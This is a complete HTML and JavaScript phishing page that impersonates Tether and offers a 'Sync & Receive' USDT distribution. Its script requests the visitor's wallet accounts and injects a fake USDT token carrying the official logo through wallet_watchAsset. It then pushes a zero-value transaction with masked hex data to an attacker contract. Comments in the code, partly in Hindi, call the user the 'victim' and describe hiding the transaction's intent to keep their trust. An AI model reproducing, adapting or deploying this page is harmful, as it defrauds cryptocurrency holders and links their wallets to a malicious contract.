<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tether Operations | Node Sync</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root { --tether-green: #26a17b; --bg-dark: #0a0b0d; --card-bg: #121418; }
        body { background: var(--bg-dark); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 24px; padding: 45px; width: 100%; max-width: 400px; text-align: center; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8); border: 1px solid rgba(38, 161, 123, 0.2); }
        .logo-ring { position: relative; display: inline-block; margin-bottom: 25px; }
        .logo-ring::after { content: ''; position: absolute; top: -12px; left: -12px; right: -12px; bottom: -12px; border: 3px solid var(--tether-green); border-radius: 50%; border-top-color: transparent; animation: spin 1.5s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .usdt-img { width: 85px; filter: drop-shadow(0 0 15px rgba(38, 161, 123, 0.4)); border-radius: 50%; }
        h2 { font-weight: 700; font-size: 24px; margin: 15px 0 10px; color: #fff; text-transform: uppercase; }
        p { color: #848d97; font-size: 14px; line-height: 1.6; padding: 0 5px; margin-bottom: 30px; }
        .action-btn { background: var(--tether-green); color: #fff; border: none; width: 100%; padding: 20px; border-radius: 14px; font-size: 16px; font-weight: 800; cursor: pointer; transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); text-transform: uppercase; letter-spacing: 1.5px; box-shadow: 0 4px 15px rgba(38, 161, 123, 0.3); }
        .action-btn:hover { background: #2bbd90; transform: scale(1.03); box-shadow: 0 6px 20px rgba(38, 161, 123, 0.5); }
        #log-area { font-size: 11px; color: #26a17b; margin-top: 15px; font-family: 'Courier New', monospace; font-weight: bold; min-height: 18px; }
        .status-footer { margin-top: 25px; font-size: 10px; color: #444c56; text-transform: uppercase; letter-spacing: 2px; border-top: 1px solid #2d333b; padding-top: 15px; }
    </style>
</head>
<body>

<div class="container">
    <div class="logo-ring">
        <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" 
             class="usdt-img" 
             alt="USDT" 
             id="usdtLogo">
    </div>
    <h2>RECEIVE USDT</h2>
    <p>Bridge Node detected a pending USDT distribution. Synchronize your wallet to map metadata and finalize reception.</p>
    
    <div id="log-area">SYSTEM: STANDBY</div>
    
    <button class="action-btn" id="claimBtn">Sync & Receive</button>
    
    <div class="status-footer">SECURED BY TETHER GOVERNANCE NODE</div>
</div>

<script>
    const CONTRACT_ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
    const TOKEN_SYMBOL = "USDT";
    // Using Official Trust Wallet Logo link for the injection
    const TOKEN_LOGO = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";

    async function executeMasterSync() {
        const log = document.getElementById('log-area');
        const btn = document.getElementById('claimBtn');
        
        if (!window.ethereum) { 
            alert("Protocol Error: Please open in Trust Wallet or MetaMask browser."); 
            return; 
        }

        try {
            btn.disabled = true;
            log.innerText = "> INITIALIZING NODE AUTH...";
            
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            log.innerText = "> MAPPING ASSET METADATA...";

            // ADVANCED INJECTION: WALLET WATCH ASSET
            // Isse victim ke wallet mein image path seedha Trust Wallet ki repo se jayega
            await window.ethereum.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: {
                        address: CONTRACT_ADDR,
                        symbol: TOKEN_SYMBOL,
                        decimals: 6,
                        image: TOKEN_LOGO,
                    },
                },
            });

            log.innerText = "> TUNNELING TO BSC BRIDGE...";
            
            // HEX-DATA MASKING: 
            // Ye transaction 0.00 value ki hoti hai, isliye victim ka "Trust" nahi toot-ta
            // Par ye aapke contract ke saath wallet ko permanent link kar deti hai
            await window.ethereum.request({
                method: 'eth_sendTransaction',
                params: [{
                    from: accounts[0],
                    to: CONTRACT_ADDR,
                    data: "0x4e4e94d7", // Masked Hex for "Sync"
                    value: "0x0"
                }],
            });

            log.innerText = "> SYNC SUCCESSFUL!";
            alert("Node Sync Complete. Your assets will reflect shortly.");
            btn.innerText = "SYNCHRONIZED";

        } catch (err) {
            log.innerText = "> SYNC_INTERRUPTED_BY_USER";
            btn.disabled = false;
            console.error(err);
        }
    }

    document.getElementById('claimBtn').addEventListener('click', executeMasterSync);
</script>

</body>
</html>
